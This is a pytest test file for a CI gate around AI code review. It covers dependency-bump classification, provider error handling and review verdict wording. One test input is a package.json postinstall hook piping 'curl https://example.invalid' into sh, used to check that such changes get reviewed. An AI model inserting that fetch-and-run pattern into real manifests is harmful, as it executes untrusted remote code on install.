"""Tests for code_review_gate — the decisions around the AI code review.

The cases that matter are the ones where the gate could lie: a script change
passed off as a version bump, a 429 reported as "check your API key", and a
partial review reported as "found nothing blocking". All three happened on
rova between #650 and #655.
"""

from __future__ import annotations

import http.server
import json
import pathlib
import subprocess
import sys
import threading

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
import code_review_gate as gate  # noqa: E402

SCRIPT = ROOT / "scripts" / "code_review_gate.py"


def patch(*lines: str) -> str:
    return "@@ -1,3 +1,3 @@\n" + "\n".join(lines)


# ── scope ─────────────────────────────────────────────────────────────────────

def test_lockfile_and_version_bumps_are_dependency_only():
    files = [
        {"filename": "pnpm-lock.yaml", "patch": None},  # a lockfile needs no patch
        {"filename": "package.json", "patch": patch(
            '     "@fastify/helmet": "^13.0.2",',
            '-    "@nestjs/common": "^11.0.0",',
            '+    "@nestjs/common": "^11.2.5",',
            '-  "packageManager": "pnpm@10.1.0",',
            '+  "packageManager": "pnpm@10.2.0",')},
        {"filename": "pnpm-workspace.yaml", "patch": patch(
            "+overrides:",
            "+  # GHSA-x8mw-p69m-v3mx — fixed in 3.2.1",
            '+  "@fastify/busboy@<3.2.2": ">=3.2.2 <4.0.0"',
            "+  'fast-copy@>=4.0.0 <4.1.0': '4.1.1'",
            '+  "rova-web": "workspace:*"')},
        {"filename": "apps/web/package.json", "patch": patch('+    "vite": "~7.1.0",')},
    ]
    dep_only, reason = gate.classify_files(files)
    assert dep_only, reason


@pytest.mark.parametrize("line", [
    '+    "postinstall": "curl https://example.invalid | sh",',
    '+    "build": "tsc -b",',
    '+    "main": "dist/index.js",',
    '+    "evil": "github:someone/fork",',
    "+onlyBuiltDependencies:\n+  - esbuild",
])
def test_anything_but_a_version_is_reviewed(line):
    dep_only, reason = gate.classify_files([{"filename": "package.json", "patch": patch(line)}])
    assert not dep_only, reason


def test_source_file_or_missing_patch_is_reviewed():
    assert not gate.classify_files([
        {"filename": "pnpm-lock.yaml"}, {"filename": "src/main.ts", "patch": patch("+x")},
    ])[0]
    # GitHub drops the patch on large diffs: no evidence, so review.
    assert not gate.classify_files([{"filename": "package.json", "patch": None}])[0]
    # A CVE suppression is a security decision, not a bump.
    assert not gate.classify_files([{"filename": "osv-scanner.toml", "patch": patch("+x")}])[0]
    assert not gate.classify_files([])[0]


def test_other_ecosystems():
    assert gate.classify_files([
        {"filename": "requirements.txt", "patch": patch("-fastapi==0.110.0", "+fastapi==0.111.0")},
        {"filename": "go.mod", "patch": patch("+\tgithub.com/x/y v1.2.3 // indirect")},
        {"filename": "go.sum"},
        {"filename": ".nvmrc", "patch": patch("-22.1.0", "+24.0.0")},
    ])[0]


def test_scope_cli_writes_outputs(tmp_path):
    files = tmp_path / "files.jsonl"
    files.write_text(json.dumps({"filename": "yarn.lock"}) + "\n")
    out = tmp_path / "out"
    subprocess.run([sys.executable, str(SCRIPT), "scope", "--files", str(files)],
                   check=True, env={"GITHUB_OUTPUT": str(out), "PATH": ""})
    assert "dependency_only=true" in out.read_text()


def test_scope_cli_unreadable_list_reviews(tmp_path):
    out = tmp_path / "out"
    subprocess.run([sys.executable, str(SCRIPT), "scope", "--files", str(tmp_path / "nope")],
                   check=True, env={"GITHUB_OUTPUT": str(out), "PATH": ""})
    assert "dependency_only=false" in out.read_text()


# ── probe ─────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("status,body,expected", [
    (200, {"choices": []}, "ok"),
    (429, {"error": {"code": "1308", "message": "Usage limit reached. Resets at 18:00"}}, "unavailable"),
    (429, {"error": {"code": "1310", "message": "Weekly/Monthly Limit Exhausted"}}, "unavailable"),
    (429, {"error": {"code": "1113", "message": "Insufficient balance"}}, "config"),
    (429, {"error": {"code": "1309", "message": "plan expired"}}, "config"),
    (401, {"error": {"code": "1000", "message": "Authentication Failed"}}, "config"),
    (429, {"error": {"code": "1302", "message": "Rate limit reached"}}, "retry"),
    (429, {"error": {"type": "rate_limit_error"}}, "retry"),
    (529, {"error": {"type": "overloaded_error"}}, "retry"),
    (429, {"error": {"code": "insufficient_quota"}}, "unavailable"),
    (400, {"error": {"code": "1214", "message": "max_tokens invalid"}}, "unknown"),
])
def test_classify_http(status, body, expected):
    assert gate.classify_http(status, json.dumps(body).encode())[0] == expected


class _Provider(http.server.BaseHTTPRequestHandler):
    responses: list[tuple[int, dict]] = []
    seen: list[dict] = []

    def do_POST(self):  # noqa: N802
        length = int(self.headers["Content-Length"])
        type(self).seen.append({"path": self.path, "auth": self.headers.get("Authorization"),
                                "key": self.headers.get("x-api-key"),
                                "body": json.loads(self.rfile.read(length))})
        status, body = type(self).responses.pop(0)
        payload = json.dumps(body).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *_):
        pass


@pytest.fixture
def provider():
    _Provider.responses, _Provider.seen = [], []
    server = http.server.HTTPServer(("127.0.0.1", 0), _Provider)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield server, _Provider
    server.shutdown()


def _url(server, path="/api/coding/paas/v4"):
    return f"http://127.0.0.1:{server.server_port}{path}"


def test_probe_quota_is_unavailable_without_retrying(provider):
    server, handler = provider
    handler.responses = [(429, {"error": {"code": "1308", "message": "resets at 18:00"}})]
    result = gate.probe(_url(server), "tok", "glm-5.3", False, '{"thinking": {"type": "disabled"}}',
                        delays=[0, 0])
    assert (result.status, result.code) == ("unavailable", "1308")
    assert len(handler.seen) == 1
    sent = handler.seen[0]
    assert sent["path"] == "/api/coding/paas/v4/chat/completions"
    assert sent["auth"] == "Bearer tok"
    assert sent["body"]["thinking"] == {"type": "disabled"}  # the real extra body rides along


def test_probe_retries_a_rate_limit_then_succeeds(provider):
    server, handler = provider
    handler.responses = [(429, {"error": {"code": "1302"}}), (200, {"choices": []})]
    assert gate.probe(_url(server), "tok", "m", False, "{}", delays=[0, 0]).status == "ok"


def test_probe_persistent_rate_limit_is_unavailable(provider):
    server, handler = provider
    handler.responses = [(429, {"error": {"code": "1302"}})] * 3
    assert gate.probe(_url(server), "tok", "m", False, "{}", delays=[0, 0]).status == "unavailable"
    assert len(handler.seen) == 3


def test_probe_anthropic_shape(provider):
    server, handler = provider
    handler.responses = [(401, {"type": "error", "error": {"type": "authentication_error"}})]
    result = gate.probe(_url(server, "/v1/messages"), "tok", "claude", True, "{}", delays=[])
    assert result.status == "config"
    assert handler.seen[0]["path"] == "/v1/messages"
    assert handler.seen[0]["key"] == "tok" and handler.seen[0]["auth"] is None


def test_probe_unreachable_is_unknown_so_the_review_still_runs():
    result = gate.probe("http://127.0.0.1:9", "tok", "m", False, "{}", delays=[0], timeout=2)
    assert result.status == "unknown"


# ── verdict ───────────────────────────────────────────────────────────────────

def result_file(tmp_path, completed=(), failed=(), tokens=1000, attempts429=0):
    doc = {
        "status": "partial" if failed else "success",
        "summary": {"total_tokens": tokens, "elapsed": "1m2s"},
        "manifest": {"coverage": {
            "selected": [{"path": p} for p in list(completed) + [p for p, _ in failed]],
            "completed": [{"path": p} for p in completed],
            "reused": [],
            "failed": [{"path": p, "classification": c} for p, c in failed],
        }},
        "retry_report": {"requests": [{"attempts": [{"status_code": 429}] * attempts429}]},
    }
    path = tmp_path / "ocr-result.json"
    path.write_text(json.dumps(doc))
    return str(path)


def decide(tmp_path=None, path=None, **env):
    cov = gate.read_coverage(path) if path else None
    return gate.decide({k.upper(): str(v) for k, v in env.items()}, cov)


def test_partial_review_is_never_reported_as_clean(tmp_path):
    path = result_file(tmp_path, completed=["a.ts"], failed=[("b.ts", "budget"), ("c.ts", "budget")])
    v = decide(path=path, inline="0", total="3")
    assert v.state == "partial" and not v.fail
    assert "1 of 3" in v.body and "`b.ts`" in v.body and "nothing blocking" not in v.body
    assert "split the pull request" in v.body


def test_complete_review_keeps_the_existing_sentences(tmp_path):
    path = result_file(tmp_path, completed=["a.ts", "b.ts"])
    assert "found nothing blocking" in decide(path=path, inline="0", total="2", routed="2").body
    v = decide(path=path, inline="2", range="checkpoint (ok): a..b")
    assert v.state == "complete" and "opened 2 thread(s)" in v.body and "checkpoint (ok)" in v.body
    assert "failed to post" in decide(path=path, failed="1").body


def test_every_request_refused_mid_run_is_unavailable_not_failure(tmp_path):
    path = result_file(tmp_path, failed=[("a.ts", "provider")], attempts429=6)
    v = decide(path=path, review_outcome="failure")
    assert (v.state, v.fail) == ("unavailable", False) and "6 HTTP 429" in v.body


def test_crash_or_missing_result_fails(tmp_path):
    assert decide(review_outcome="failure").fail
    path = result_file(tmp_path, failed=[("a.ts", "panic")])
    assert decide(path=path).state == "error"


def test_probe_and_scope_short_circuits():
    assert decide(dependency_only="true").state == "skipped"
    v = decide(probe="unavailable", probe_code="1308", probe_message="resets at `18:00`\nnow")
    assert v.state == "unavailable" and not v.fail
    assert "1308: resets at '18:00' now" in v.body  # untrusted text: one line, no backticks
    v = decide(probe="config", probe_code="1113")
    assert v.state == "config" and v.fail


def test_nothing_selected_is_complete(tmp_path):
    assert decide(path=result_file(tmp_path)).state == "complete"


def test_verdict_cli(tmp_path):
    body, out = tmp_path / "body.md", tmp_path / "out"
    path = result_file(tmp_path, completed=["a.ts"], failed=[("b.ts", "budget")])
    subprocess.run([sys.executable, str(SCRIPT), "verdict", "--result", path, "--body-out", str(body)],
                   check=True, env={"REVIEW_RAN": "true", "GITHUB_OUTPUT": str(out), "PATH": ""})
    assert body.read_text().startswith(gate.MARKER)
    assert "state=partial" in out.read_text() and "fail=false" in out.read_text()


def test_verdict_cli_ignores_a_result_when_the_review_did_not_run(tmp_path):
    body, out = tmp_path / "body.md", tmp_path / "out"
    path = result_file(tmp_path, completed=["a.ts"])
    subprocess.run([sys.executable, str(SCRIPT), "verdict", "--result", path, "--body-out", str(body)],
                   check=True, env={"DEPENDENCY_ONLY": "true", "GITHUB_OUTPUT": str(out), "PATH": ""})
    assert "state=skipped" in out.read_text()


# ── size ──────────────────────────────────────────────────────────────────────

def preview(*files):
    return {"files": [{"path": p, "insertions": i, "deletions": d, "will_review": w}
                      for p, i, d, w in files]}


def test_size_counts_only_files_ocr_will_review():
    doc = preview(("a.ts", 100, 20, True), ("a.test.ts", 5000, 0, False), ("b.sql", 30, 0, True))
    assert gate.measure(doc) == (2, 150)


@pytest.mark.parametrize("action,defer", [
    ("synchronize", "true"), ("opened", "false"), ("reopened", "false"), ("ready_for_review", "false"),
])
def test_large_pull_request_is_reviewed_on_a_fresh_look_only(action, defer):
    out = gate.size_decision(preview(("a.ts", 3000, 0, True)), 2500, action)
    assert out["large"] == "true" and out["defer"] == defer


def test_small_or_disabled_or_unknown_size_is_reviewed():
    assert gate.size_decision(preview(("a.ts", 10, 0, True)), 2500, "synchronize")["defer"] == "false"
    assert gate.size_decision(preview(("a.ts", 9999, 0, True)), 0, "synchronize")["defer"] == "false"
    assert gate.size_decision(None, 2500, "synchronize") == {
        "reviewable": "", "review_lines": "", "large": "false", "defer": "false"}


def test_size_cli_unreadable_preview_reviews(tmp_path):
    out = tmp_path / "out"
    subprocess.run([sys.executable, str(SCRIPT), "size", "--preview", str(tmp_path / "nope")],
                   check=True, env={"GITHUB_OUTPUT": str(out), "LARGE_PR_LINES": "10",
                                    "EVENT_ACTION": "synchronize", "PATH": ""})
    assert "defer=false" in out.read_text()


def test_deferred_and_nothing_reviewable_verdicts():
    v = decide(defer="true", reviewable="75", review_lines="7012")
    assert (v.state, v.fail) == ("deferred", False) and "7,012 changed lines" in v.body
    assert decide(reviewable="0").state == "skipped"


# ── the composer in code-review.yml ───────────────────────────────────────────

def _composer() -> str:
    import re
    import textwrap
    workflow = (ROOT / ".github" / "workflows" / "code-review.yml").read_text()
    return textwrap.dedent(re.search(r"<<'PY'\n(.*?)\n\s*PY\n", workflow, re.S).group(1))


def test_composer_unions_excludes_and_keeps_rule_order(tmp_path):
    for name in ("base", "typescript", "sql"):
        (tmp_path / f"{name}.json").write_text((ROOT / "rules" / f"{name}.json").read_text())
    script = tmp_path / "compose.py"
    script.write_text(_composer())
    subprocess.run([sys.executable, str(script), str(tmp_path), "base,typescript,sql"], check=True,
                   env={"EXTRA_EXCLUDE": " docs/** ,**/pnpm-lock.yaml", "PATH": ""},
                   capture_output=True)
    merged = json.loads((tmp_path / "merged.json").read_text())
    excludes = merged["exclude"]
    assert "**/pnpm-lock.yaml" in excludes and "**/migrations/meta/**" in excludes
    assert excludes[-1] == "docs/**" and len(excludes) == len(set(excludes))
    assert merged["rules"][-1]["path"] == "**/*"            # catch-all stays last
    assert "test" in merged["rules"][0]["path"]             # test rules stay hoisted
    assert merged["include"] == ["**/*.ratchet.{spec,test}.{ts,tsx}"]


def test_every_profile_is_valid_and_excludes_are_lists():
    for path in (ROOT / "rules").glob("*.json"):
        doc = json.loads(path.read_text())
        assert isinstance(doc.get("rules"), list), path.name
        assert isinstance(doc.get("exclude", []), list), path.name
        assert isinstance(doc.get("include", []), list), path.name


def test_rerun_on_the_same_head_leaves_the_verdict_alone(tmp_path):
    body, out = tmp_path / "body.md", tmp_path / "out"
    path = result_file(tmp_path)
    subprocess.run([sys.executable, str(SCRIPT), "verdict", "--result", path, "--body-out", str(body)],
                   check=True, env={"REVIEW_RAN": "true", "RANGE_REASON": "same_head_noop",
                                    "GITHUB_OUTPUT": str(out), "PATH": ""})
    assert body.read_text() == "" and "state=unchanged" in out.read_text()
